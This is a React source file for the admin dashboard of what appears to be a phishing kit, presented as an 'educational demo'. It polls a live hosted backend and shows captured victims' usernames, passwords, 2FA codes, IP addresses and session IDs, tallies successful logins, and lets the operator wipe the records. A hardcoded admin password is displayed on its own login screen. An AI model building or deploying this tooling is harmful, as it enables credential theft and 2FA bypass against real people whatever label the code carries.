import React, { useState, useEffect } from 'react';
import './AdminDashboard.css';

const AdminDashboard = () => {
  const [capturedData, setCapturedData] = useState([]);
  const [stats, setStats] = useState({});
  const [loading, setLoading] = useState(true);
  const [autoRefresh, setAutoRefresh] = useState(true);
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [adminPassword, setAdminPassword] = useState('');
  const [authError, setAuthError] = useState('');

  // Admin password (should match backend)
  const CORRECT_PASSWORD = 'educate2024';

  const handleAdminLogin = (e) => {
    e.preventDefault();
    if (adminPassword === CORRECT_PASSWORD) {
      setIsAuthenticated(true);
      setAuthError('');
      fetchData(); // Load data after successful login
    } else {
      setAuthError('Invalid admin password');
    }
  };

  const fetchData = async () => {
    if (!isAuthenticated) return;
    
    try {
      const response = await fetch('http://nuns-production.up.railway.app/admin', {
        headers: {
          'Authorization': `Bearer ${CORRECT_PASSWORD}`
        }
      });
      
      if (response.status === 401) {
        setIsAuthenticated(false);
        setAuthError('Session expired - please login again');
        return;
      }
      
      const result = await response.json();
      
      if (result.success) {
        setCapturedData(result.data);
        setStats(result.stats);
      }
    } catch (error) {
      console.log('⚠️ Backend not available or authentication failed');
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (isAuthenticated && autoRefresh) {
      const interval = setInterval(fetchData, 3000);
      return () => clearInterval(interval);
    }
  }, [isAuthenticated, autoRefresh]);

  const clearData = async () => {
    try {
      const response = await fetch('https://nuns-production.up.railway.app/api/admin/clear', {
        method: 'DELETE',
        headers: {
          'Authorization': `Bearer ${CORRECT_PASSWORD}`
        }
      });
      
      if (response.status === 401) {
        setIsAuthenticated(false);
        return;
      }
      
      const result = await response.json();
      
      if (result.success) {
        setCapturedData([]);
        alert(`Cleared ${result.clearedCount} items`);
        fetchData();
      }
    } catch (error) {
      console.log('Clear data error:', error);
    }
  };

  const getTypeColor = (type) => {
    switch(type) {
      case 'LOGIN_ATTEMPT': return '#ff6b6b';
      case '2FA_ATTEMPT': return '#ffa726';
      case 'LOGIN_SUCCESS': return '#4caf50';
      default: return '#78909c';
    }
  };

  // Admin Login Form
  if (!isAuthenticated) {
    return (
      <div className="admin-login-container">
        <div className="admin-login-form">
          <div className="login-header">
            <h1>🔐 Admin Access</h1>
            <p>Enter the admin password to access the monitoring dashboard</p>
          </div>
          
          <form onSubmit={handleAdminLogin} className="login-form">
            <div className="form-group">
              <label htmlFor="adminPassword">Admin Password</label>
              <input
                type="password"
                id="adminPassword"
                value={adminPassword}
                onChange={(e) => setAdminPassword(e.target.value)}
                placeholder="Enter admin password"
                required
              />
            </div>
            
            {authError && (
              <div className="error-message">
                {authError}
              </div>
            )}
            
            <button type="submit" className="login-button">
              Access Dashboard
            </button>
          </form>
          
          <div className="login-footer">
            <p><strong>Default Password:</strong> educate2024</p>
            <p>This is the protected admin area for the educational demo</p>
          </div>
        </div>
      </div>
    );
  }

  if (loading) {
    return (
      <div className="admin-dashboard loading">
        <div className="loading-spinner">⏳ Loading captured data...</div>
      </div>
    );
  }

  return (
    <div className="admin-dashboard">
      <div className="dashboard-header">
        <div className="header-top">
          <h1>🕵️ Educational Demo - Live Monitoring Dashboard</h1>
          <button 
            className="logout-btn"
            onClick={() => setIsAuthenticated(false)}
          >
            🚪 Logout
          </button>
        </div>
        <p>This dashboard shows real-time credential capture for cybersecurity education</p>
        
        <div className="dashboard-controls">
          <button 
            className={`refresh-btn ${autoRefresh ? 'active' : ''}`}
            onClick={() => setAutoRefresh(!autoRefresh)}
          >
            {autoRefresh ? '🟢 Auto Refresh ON' : '🔴 Auto Refresh OFF'}
          </button>
          <button className="clear-btn" onClick={clearData}>
            🗑️ Clear All Data
          </button>
          <button className="refresh-btn" onClick={fetchData}>
            🔄 Refresh Now
          </button>
        </div>
      </div>

      {/* Statistics Overview */}
      <div className="stats-overview">
        <div className="stat-card">
          <div className="stat-icon">📊</div>
          <div className="stat-content">
            <h3>Total Captured</h3>
            <div className="stat-number">{stats.totalCaptured || 0}</div>
          </div>
        </div>
        
        <div className="stat-card">
          <div className="stat-icon">🔑</div>
          <div className="stat-content">
            <h3>Login Attempts</h3>
            <div className="stat-number">{stats.loginAttempts || 0}</div>
          </div>
        </div>
        
        <div className="stat-card">
          <div className="stat-icon">🔢</div>
          <div className="stat-content">
            <h3>2FA Attempts</h3>
            <div className="stat-number">{stats.twoFAAttempts || 0}</div>
          </div>
        </div>
        
        <div className="stat-card">
          <div className="stat-icon">✅</div>
          <div className="stat-content">
            <h3>Successful Logins</h3>
            <div className="stat-number">{stats.successfulLogins || 0}</div>
          </div>
        </div>
        
        <div className="stat-card">
          <div className="stat-icon">🌐</div>
          <div className="stat-content">
            <h3>Unique IPs</h3>
            <div className="stat-number">{stats.uniqueIPs || 0}</div>
          </div>
        </div>
      </div>

      {/* Captured Data Table */}
      <div className="captured-data-section">
        <h2>📋 Live Captured Data</h2>
        
        {capturedData.length === 0 ? (
          <div className="no-data">
            <p>No data captured yet. Visit the login page to see live capture in action.</p>
          </div>
        ) : (
          <div className="data-table">
            {capturedData.map((item, index) => (
              <div key={item.id || index} className="data-item" style={{ borderLeftColor: getTypeColor(item.type) }}>
                <div className="data-header">
                  <span className="data-type" style={{ color: getTypeColor(item.type) }}>
                    {item.type}
                  </span>
                  <span className="data-time">
                    {new Date(item.timestamp).toLocaleString()}
                  </span>
                </div>
                
                <div className="data-content">
                  {item.identifier && (
                    <p><strong>📧 Identifier:</strong> {item.identifier}</p>
                  )}
                  {item.password && (
                    <p><strong>🔑 Password:</strong> <span className="sensitive-data">{item.password}</span></p>
                  )}
                  {item.code && (
                    <p><strong>🔢 2FA Code:</strong> <span className="sensitive-data">{item.code}</span></p>
                  )}
                  {item.ip && (
                    <p><strong>🌐 IP Address:</strong> {item.ip}</p>
                  )}
                  {item.sessionId && (
                    <p><strong>🆔 Session:</strong> <code>{item.sessionId.substring(0, 8)}...</code></p>
                  )}
                </div>
              </div>
            ))}
          </div>
        )}
      </div>

      {/* Educational Notes */}
      <div className="educational-notes">
        <h3>🎓 Educational Purpose</h3>
        <p>This dashboard demonstrates how phishing attacks capture credentials in real-time.</p>
        <ul>
          <li>✅ Shows the complete attack flow from login to 2FA bypass</li>
          <li>✅ Demonstrates real-time data capture techniques</li>
          <li>✅ Educational tool for cybersecurity awareness</li>
          <li>⚠️ For demonstration purposes only</li>
          <li>🔐 <strong>Protected Area:</strong> Requires admin authentication</li>
        </ul>
      </div>
    </div>
  );
};

export default AdminDashboard;
